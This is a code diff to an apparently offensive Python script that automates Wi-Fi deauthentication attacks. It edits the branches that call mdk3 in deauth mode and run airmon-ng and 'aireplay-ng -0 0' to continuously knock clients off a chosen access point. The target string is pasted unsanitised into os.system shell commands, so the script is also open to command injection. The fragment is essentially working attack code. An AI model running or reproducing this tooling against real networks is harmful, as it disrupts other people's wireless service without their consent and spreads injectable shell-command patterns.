@@ -56,14 +56,14 @@ os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's
 print("")
 
 if attack == 1:
+  print("############################# mdk3 attack! ###################################")
   os.system("monitor=`cat monitor.rmo`mon && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
-elif attack == 2:
+else:
+  print("############################# Aireplay attack! ###################################")
   os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
   os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
   os.system("monitor=`cat monitor.rmo` && airmon-ng stop $monitor")
   os.system('rm *.rmo && rm target*')
-else:
-  print("Please restart the app!")
   
 #print("")
 print("Return configurations: ")
